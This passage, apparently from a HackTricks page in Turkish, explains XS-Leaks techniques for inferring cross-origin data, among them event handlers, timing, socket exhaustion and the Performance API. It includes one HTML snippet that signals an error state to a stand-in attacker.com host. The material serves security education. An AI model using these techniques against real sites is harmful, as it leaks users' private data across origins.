# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerini** kullanarak **çapraz kaynak bilgilerini** **çıkarmak için** kullanılan bir yöntemdir.

Bu saldırıda yer alan ana bileşenler şunlardır:

- **Zayıf Web**: Bilgilerin çıkarılmasının hedeflendiği web sitesi.
- **Saldırganın Web'i**: Saldırgan tarafından oluşturulan, kurbanın ziyaret ettiği ve istismarı barındıran kötü niyetli web sitesi.
- **Dahil Etme Yöntemi**: Zayıf Web'i Saldırganın Web'ine dahil etmek için kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
- **Sızıntı Tekniği**: Dahil etme yöntemi aracılığıyla toplanan bilgilere dayanarak Zayıf Web'in durumundaki farklılıkları ayırt etmek için kullanılan teknikler.
- **Durumlar**: Saldırganın ayırt etmeyi hedeflediği Zayıf Web'in iki potansiyel durumu.
- **Algılanabilir Farklılıklar**: Saldırganın Zayıf Web'in durumunu çıkarmak için güvendiği gözlemlenebilir varyasyonlar.

### Algılanabilir Farklılıklar

Zayıf Web'in durumlarını ayırt etmek için analiz edilebilecek birkaç yön vardır:

- **Durum Kodu**: **Çeşitli HTTP yanıt durum kodları** arasında ayırt etme, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi.
- **API Kullanımı**: Sayfalar arasında **Web API'lerinin kullanımını** belirleme, çapraz kaynak bir sayfanın belirli bir JavaScript Web API'sini kullanıp kullanmadığını ortaya çıkarma.
- **Yönlendirmeler**: Farklı sayfalara yapılan navigasyonları tespit etme, sadece HTTP yönlendirmeleri değil, aynı zamanda JavaScript veya HTML tarafından tetiklenenleri de.
- **Sayfa İçeriği**: **HTTP yanıt gövdesindeki** veya sayfa alt kaynaklarındaki varyasyonları gözlemleme, örneğin **gömülü çerçeve sayısı** veya resimlerdeki boyut farklılıkları.
- **HTTP Başlığı**: **Belirli bir HTTP yanıt başlığının** varlığını veya muhtemel değerini not etme, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıklar dahil.
- **Zamanlama**: İki durum arasındaki tutarlı zaman farklılıklarını fark etme.

### Dahil Etme Yöntemleri

- **HTML Elemanları**: HTML, **çapraz kaynak dahil etme** için çeşitli elemanlar sunar, stil sayfaları, resimler veya betikler gibi, tarayıcının HTML dışı bir kaynağı talep etmesini zorunlu kılar. Bu amaçla potansiyel HTML elemanlarının bir derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
- **Çerçeveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Sayfa **çerçeve koruması** eksikse, JavaScript, içerikWindow özelliği aracılığıyla çerçevelenmiş kaynağın pencere nesnesine erişebilir.
- **Açılır Pencereler**: **`window.open`** yöntemi, bir kaynağı yeni bir sekmede veya pencerede açar, JavaScript'in SOP'ye uygun olarak yöntemler ve özelliklerle etkileşimde bulunması için bir **pencere tutamacı** sağlar. Açılır pencereler, genellikle tek oturum açma işlemlerinde kullanılır, hedef kaynağın çerçeveleme ve çerez kısıtlamalarını aşar. Ancak, modern tarayıcılar açılır pencere oluşturmayı belirli kullanıcı eylemleriyle sınırlamaktadır.
- **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapmaya izin verir. Bu yöntemler, isteği takip etme gibi isteğin üzerinde hassas kontrol sağlar.

### Sızıntı Teknikleri

- **Olay İşleyici**: XS-Leaks'teki klasik bir sızıntı tekniği, **onload** ve **onerror** gibi olay işleyicilerin kaynak yükleme başarısı veya başarısızlığı hakkında bilgi sağlamasıdır.
- **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, ya hata mesajından doğrudan ya da varlığı ve yokluğu arasındaki farkı ayırt ederek sızıntı bilgisi sağlayabilir.
- **Küresel Sınırlar**: Bir tarayıcının fiziksel sınırlamaları, bellek kapasitesi veya diğer zorunlu tarayıcı sınırları gibi, bir eşik aşıldığında sinyal verebilir ve sızıntı tekniği olarak hizmet edebilir.
- **Küresel Durum**: Tarayıcıların **küresel durumları** (örneğin, Geçmiş arayüzü) ile algılanabilir etkileşimler istismar edilebilir. Örneğin, bir tarayıcının geçmişindeki **giriş sayısı**, çapraz kaynak sayfalar hakkında ipuçları verebilir.
- **Performans API'si**: Bu API, **mevcut sayfanın performans detaylarını** sağlar, belgeler ve yüklenen kaynaklar için ağ zamanlaması dahil, talep edilen kaynaklar hakkında çıkarımlar yapılmasına olanak tanır.
- **Okunabilir Nitelikler**: Bazı HTML nitelikleri **çapraz kaynak olarak okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, JavaScript'in bir web sayfasında çapraz kaynak olarak dahil edilen çerçeveleri saymasına olanak tanır.

## XSinator Aracı ve Makalesi

XSinator, **birçok bilinen XS-Leaks'e karşı tarayıcıları kontrol etmek için** otomatik bir araçtır ve makalesinde açıklanmıştır: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araca **şu adresten erişebilirsiniz** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Hariç Tutulan XS-Leaks**: XSinator'daki diğer sızıntılarla çelişeceği için **hizmet çalışanlarına** dayanan XS-Leaks'leri hariç tutmak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırma ve hatalara dayanan XS-Leaks'leri de **hariç tutmayı** seçtik. Örneğin, CrossOrigin Resource Sharing (CORS) yanlış yapılandırmaları, postMessage sızıntısı veya Cross-Site Scripting. Ayrıca, genellikle yavaş, gürültülü ve hatalı oldukları için zaman tabanlı XS-Leaks'leri de hariç tuttuk.

## **Zaman Tabanlı Teknikler**

Aşağıdaki tekniklerden bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için zaman kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API'si, geliştiricilerin yüksek çözünürlüklü zaman ölçümleri almasına olanak tanır.\
Saldırganların örtük saatler oluşturmak için kötüye kullanabileceği önemli sayıda API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

- **Dahil Etme Yöntemleri**: Çerçeveler, HTML Elemanları
- **Algılanabilir Farklılık**: Durum Kodu
- **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Özet**: Bir kaynağı yüklemeye çalışırken, onerror/onload olayları, kaynağın başarıyla/başarısız bir şekilde yüklenmesiyle tetiklenir; durum kodunu belirlemek mümkündür.
- **Kod örneği**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Kod örneği, **JS'den betik nesnelerini yüklemeye** çalışır, ancak **diğer etiketler** (örneğin, nesneler, stil sayfaları, resimler, sesler) de kullanılabilir. Ayrıca, **etiketi doğrudan** enjekte etmek ve `onload` ve `onerror` olaylarını etiketin içinde tanımlamak da mümkündür (JS'den enjekte etmek yerine).

Bu saldırının ayrıca bir betiksiz versiyonu da vardır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda, eğer `example.com/404` bulunamazsa, `attacker.com/?error` yüklenecektir.

### Onload Zamanlaması

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API'si**, bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Ancak, 50ms'den fazla süren görevleri tanımlayabilen [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Zamanlaması + Zorunlu Ağır Görev

Bu teknik, bir öncekiyle aynıdır, ancak **saldırgan** ayrıca **cevap olumlu veya olumsuz olduğunda** **ilgili bir süre** alacak bir eylemi **zorlayacaktır** ve o süreyi ölçer.

{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Zamanlaması

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Özet:** [SharedArrayBuffer saati](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers), bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağı almak için geçen süre, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) olaylarını kullanarak ölçülebilir. **`beforeunload`** olayı, tarayıcının yeni bir sayfaya geçiş yapmadan önce tetiklenirken, **`unload`** olayı geçişin gerçekten gerçekleştiği anda meydana gelir. Bu iki olay arasındaki zaman farkı, **tarayıcının kaynağı almak için harcadığı süreyi** belirlemek için hesaplanabilir.

### Sandboxed Çerçeve Zamanlaması + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API'si, bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) yokluğunda, bir sayfanın ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken zamanın bir saldırgan tarafından ölçülebileceği gözlemlenmiştir. Bu ölçüm genellikle mümkündür çünkü bir iframe'in `onload` işleyicisi, yalnızca kaynak yüklemesi ve JavaScript yürütmesi tamamlandıktan sonra tetiklenir. Script yürütmesinin getirdiği değişkenliği aşmak için, bir saldırgan `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) niteliğini kullanabilir. Bu niteliğin dahil edilmesi, JavaScript'in yürütülmesi gibi birçok işlevselliği kısıtlar ve böylece ağırlıklı olarak ağ performansından etkilenen bir ölçüm yapılmasını kolaylaştırır.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**:
- **Summary**: Eğer doğru içeriğe erişildiğinde sayfa hata verip, herhangi bir içerik erişildiğinde doğru bir şekilde yükleniyorsa, o zaman tüm bilgileri zaman ölçmeden çıkarmak için bir döngü oluşturabilirsiniz.
- **Code Example**:

Farz edelim ki **gizli** içeriği **bir Iframe'in içinde** **ekleyebilirsiniz**.

**Kurbanın**, bir **Iframe** kullanarak "_**flag**_" içeren dosyayı **aramasını** sağlayabilirsiniz (örneğin bir CSRF istismar ederek). Iframe içinde, _**onload olayı**_ her zaman **en az bir kez** **çalıştırılacağını** biliyorsunuz. Sonra, **iframe**'in **URL**'sini değiştirerek sadece **hash** içeriğini değiştirebilirsiniz.

Örneğin:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Eğer ilk URL **başarıyla yüklendiyse**, o zaman **URL**'nin **hash** kısmını **değiştirirken** **onload** olayı **tekrar tetiklenmeyecek**. Ama **eğer** sayfa **yüklenirken** bir tür **hata** almışsa, o zaman **onload** olayı **tekrar tetiklenecektir**.

Böylece, erişildiğinde **doğru** yüklenmiş bir sayfa ile **hata** olan bir sayfa arasında **ayrım** yapabilirsiniz.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**:
- **Summary:** Eğer **sayfa** **hassas** içeriği **dönüyorsa**, **veya** kullanıcı tarafından **kontrol edilebilen** bir **içerik** dönüyorsa. Kullanıcı **geçersiz durumda** **geçerli JS kodu** ayarlayabilir, her denemede **`<script>`** etiketleri içinde **yükleyebilir**, böylece **geçersiz** durumlarda saldırganların **kodu** **çalıştırılır**, ve **geçerli** durumlarda **hiçbir şey** çalıştırılmaz.
- **Code Example:**

{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Durum Kodu & Başlıklar
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)**, web sayfalarının belirli hassas çapraz kaynaklı kaynakları yüklemesini engelleyen bir güvenlik önlemidir. Ancak, saldırganlar bu koruyucu davranışı istismar edebilir. **CORB**'ye tabi bir yanıt, `nosniff` ile birlikte _**CORB korumalı**_ `Content-Type` ve `2xx` durum kodu dönerse, **CORB** yanıtın gövdesini ve başlıklarını temizler. Bunu gözlemleyen saldırganlar, **durum kodu** (başarı veya hata gösteren) ve `Content-Type` (koruma altında olup olmadığını belirten) kombinasyonunu çıkarabilir, bu da potansiyel bilgi sızıntısına yol açar.
- **Code Example**:

Daha fazla bilgi için bağlantıyı kontrol edin.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: id veya name niteliğinden hassas verileri sızdırın.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir **iframe** içinde **bir sayfa yüklemek** ve sayfanın **belirtilen** öğeye **odaklanmasını** sağlamak için **`#id_value`** kullanmak mümkündür, ardından bir **`onblur`** sinyali tetiklendiğinde, ID öğesi vardır.\
Aynı saldırıyı **`portal`** etiketleri ile de gerçekleştirebilirsiniz.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-up'lar
- **Detectable Difference**: API Kullanımı
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: postMessage'dan hassas bilgileri toplayın veya postMessages'ın varlığını kullanarak kullanıcının sayfadaki durumunu bilmek için bir oracle olarak kullanın.
- **Code Example**: `Tüm postMessages'ı dinleyen herhangi bir kod.`

Uygulamalar genellikle [`postMessage` yayınlarını](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) farklı kaynaklar arasında iletişim kurmak için kullanır. Ancak, bu yöntem `targetOrigin` parametresi doğru bir şekilde belirtilmezse, **hassas bilgileri** yanlışlıkla açığa çıkarabilir, bu da herhangi bir pencerenin mesajları almasına izin verir. Ayrıca, bir mesajı almanın kendisi bir **oracle** işlevi görebilir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının kimlik durumu hakkında bilgi verebilir, örneğin oturum açıp açmadıkları gibi.

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-up'lar
- **Detectable Difference**: API Kullanımı
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: WebSocket bağlantı limitini aşmak, bir çapraz kaynak sayfasının WebSocket bağlantı sayısını sızdırır.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Bir hedef sayfanın **kaç tane WebSocket bağlantısı kullandığını** belirlemek mümkündür. Bu, bir saldırganın uygulama durumlarını tespit etmesine ve WebSocket bağlantı sayısına bağlı bilgileri sızdırmasına olanak tanır.

Eğer bir **kaynak** maksimum sayıda WebSocket bağlantı nesnesi kullanıyorsa, bağlantı durumlarından bağımsız olarak, **yeni nesnelerin oluşturulması JavaScript istisnalarına** yol açar. Bu saldırıyı gerçekleştirmek için, saldırgan web sitesi hedef web sitesini bir pop-up veya iframe içinde açar ve ardından hedef web yüklendikten sonra mümkün olan maksimum sayıda WebSocket bağlantısı oluşturmaya çalışır. **Atılan istisnaların sayısı**, hedef web sitesinin kullandığı **WebSocket bağlantı sayısıdır**.

### Payment API

- **Inclusion Methods**: Frames, Pop-up'lar
- **Detectable Difference**: API Kullanımı
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Sadece birinin aktif olabileceğini tespit edin.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Sızıntı, bir saldırganın **bir çapraz kaynak sayfasının bir ödeme talebi başlattığını tespit etmesine** olanak tanır.

Çünkü **sadece bir ödeme talebi aktif** olabileceğinden, eğer hedef web sitesi Payment Request API'sini kullanıyorsa, bu API'yi kullanma girişimleri **başarısız olacak** ve bir **JavaScript istisnası** oluşturacaktır. Saldırgan, **periyodik olarak Payment API UI'sini göstermeye çalışarak** bunu istismar edebilir. Eğer bir deneme bir istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, UI oluşturulduktan hemen sonra kapatarak bu periyodik denemeleri gizleyebilir.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Tek iş parçacıklı JS olay döngüsünü kötüye kullanarak bir webin yürütme süresini ölçün.
- **Code Example**:

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript, [tek iş parçacıklı bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modelinde çalışır, bu da **sadece bir görevi aynı anda çalıştırabileceği** anlamına gelir. Bu özellik, **farklı bir kaynaktan gelen kodun çalıştırılmasının ne kadar sürdüğünü ölçmek için istismar edilebilir**. Bir saldırgan, sabit özelliklere sahip olayları sürekli olarak göndererek kendi kodunun yürütme süresini olay döngüsünde ölçebilir. Bu olaylar, olay havuzu boş olduğunda işlenecektir. Eğer diğer kaynaklar da aynı havuza olay gönderiyorsa, bir **saldırgan, kendi görevlerinin yürütülmesindeki gecikmeleri gözlemleyerek bu dış olayların yürütülmesinin ne kadar sürdüğünü çıkarabilir**. Olay döngüsündeki gecikmeleri izleme yöntemi, farklı kaynaklardan gelen kodun yürütme süresini açığa çıkarabilir ve potansiyel olarak hassas bilgileri sızdırabilir.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce kullanılan kaynakları yükleyerek.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Bir web işleminin yürütme süresini ölçmenin bir yöntemi, bir iş parçacığının olay döngüsünü kasıtlı olarak engellemek ve ardından **olay döngüsünün tekrar kullanılabilir hale gelmesi için ne kadar sürdüğünü** zamanlamaktır. Olay döngüsüne bir engelleyici işlem (uzun bir hesaplama veya senkron API çağrısı gibi) ekleyerek ve sonraki kodun yürütülmeye başlaması için geçen süreyi izleyerek, engelleme süresi boyunca olay döngüsünde yürütülen görevlerin süresini çıkarabilirsiniz. Bu teknik, JavaScript'in olay döngüsünün tek iş parçacıklı doğasını kullanır; burada görevler sıralı olarak yürütülür ve aynı iş parçacığını paylaşan diğer işlemlerin performansı veya davranışı hakkında içgörüler sağlayabilir.
- **Code Example**:

Olay döngüsünü kilitleyerek yürütme süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu aşma potansiyelidir. **Site İzolasyonu**, farklı web sitelerini ayrı süreçlere ayıran bir güvenlik özelliğidir ve kötü niyetli sitelerin diğer sitelerden hassas verilere doğrudan erişimini engellemeyi amaçlar. Ancak, bir saldırgan, paylaşılan olay döngüsü aracılığıyla başka bir kaynağın yürütme zamanlamasını etkileyerek, o kaynağın faaliyetleri hakkında dolaylı olarak bilgi çıkarabilir. Bu yöntem, diğer kaynağın verilerine doğrudan erişim gerektirmez, bunun yerine o kaynağın faaliyetlerinin paylaşılan olay döngüsü üzerindeki etkisini gözlemler, böylece **Site İzolasyonu** tarafından oluşturulan koruyucu engellerden kaçınır.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce kullanılan kaynakları yükleyerek.

### Connection Pool

- **Inclusion Methods**: JavaScript İstekleri
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Bir saldırgan, 1 hariç tüm soketleri kilitleyebilir, hedef web'i yükleyebilir ve aynı anda başka bir sayfayı yükleyebilir, son sayfanın yüklenmeye başlaması için geçen süre, hedef sayfanın yüklenmesi için geçen süredir.
- **Code Example**:

{{#ref}}
connection-pool-example.md
{{#endref}}

Tarayıcılar, sunucu iletişimi için soketler kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, **tarayıcılar eşzamanlı soket sayısına bir sınır koymak zorundadır**. Saldırganlar bu sınırlamayı aşağıdaki adımlarla istismar edebilir:

1. Tarayıcının soket limitini belirleyin, örneğin, 256 global soket.
2. 255 soketi uzun bir süre boyunca, bağlantıları tamamlamadan açık tutacak şekilde, çeşitli hostlara 255 istek başlatarak doldurun.
3. Hedef sayfaya bir istek göndermek için 256. soketi kullanın.
4. Farklı bir hosta 257. bir istek yapmaya çalışın. Tüm soketler kullanıldığından (2. ve 3. adımlara göre), bu istek, bir soket mevcut olana kadar bekletilecektir. Bu isteğin ilerlemesi için geçen süre, saldırgana 256. soketle (hedef sayfanın soketi) ilgili ağ etkinliği hakkında zaman bilgisi sağlar. Bu çıkarım, 2. adımda yer alan 255 soketin hala meşgul olması nedeniyle mümkündür; bu da, yeni mevcut olan soketin 3. adımda serbest bırakılan soket olması gerektiği anlamına gelir. 256. soketin mevcut hale gelmesi için geçen süre, dolayısıyla hedef sayfaya yapılan isteğin tamamlanması için gereken süreyle doğrudan bağlantılıdır.

Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript İstekleri
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**:
- **Summary:** Önceki teknikle aynı, ancak tüm soketleri kullanmak yerine Google **Chrome** aynı kaynağa **6 eşzamanlı istekle** sınırlama koyar. Eğer **5'ini engellersek** ve sonra **6. bir istek başlatırsak**, bunu **zamanlayabiliriz** ve eğer **kurban sayfası** aynı uç noktaya daha fazla **istek gönderirse**, **6. istek** **daha uzun** sürecektir ve bunu tespit edebiliriz.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) web uygulamalarının performans metrikleri hakkında içgörüler sunar ve [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) ile daha da zenginleştirilmiştir. Resource Timing API, isteklerin süresi gibi ayrıntılı ağ isteği zamanlamalarını izlemeyi sağlar. Özellikle, sunucular yanıtlarında `Timing-Allow-Origin: *` başlığını içerdiğinde, transfer boyutu ve alan adı arama süresi gibi ek veriler kullanılabilir hale gelir.

Bu veri zenginliği, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla elde edilebilir ve performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak yürütme sürelerini ölçmeyi kolaylaştırır. Ancak, Chrome gibi bazı tarayıcılarda `performance.now()`'un hassasiyetinin milisaniyelerle sınırlı olabileceği ve bu durumun zamanlama ölçümlerinin ayrıntılığını etkileyebileceği unutulmamalıdır.

Zamanlama ölçümlerinin ötesinde, Performance API güvenlikle ilgili içgörüler için de kullanılabilir. Örneğin, Chrome'daki `performance` nesnesinde sayfaların varlığı veya yokluğu, `X-Frame-Options` uygulandığını gösterebilir. Özellikle, bir sayfa `X-Frame-Options` nedeniyle bir çerçevede render edilmekten engellenirse, `performance` nesnesinde kaydedilmeyecektir, bu da sayfanın çerçeveleme politikaları hakkında ince bir ipucu sağlar.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elemanları
- **Detectable Difference**: Durum Kodu
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Hatalarla sonuçlanan bir istek, bir kaynak zamanlama girişi oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

HTTP yanıt durum kodları arasında **ayrım yapmak mümkündür** çünkü bir **hata** ile sonuçlanan istekler **performans girişi** oluşturmaz.

### Style Reload Error

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Durum Kodu
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Bir tarayıcı hatası nedeniyle, hatalarla sonuçlanan istekler iki kez yüklenir.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Önceki teknikte, yüklenemeyen kaynakların **iki kez yüklendiği** durumları belirten iki tarayıcı hatası tespit edilmiştir. Bu, Performans API'sinde birden fazla girişe yol açar ve bu nedenle tespit edilebilir.

### Request Merging Error

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Durum Kodu
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Hata ile sonuçlanan istekler birleştirilemez.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Bu teknik, bahsedilen belgede bir tabloda bulunmuştur ancak teknikle ilgili bir açıklama bulunmamıştır. Ancak, [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde kontrol ederek kaynak kodunu bulabilirsiniz.

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
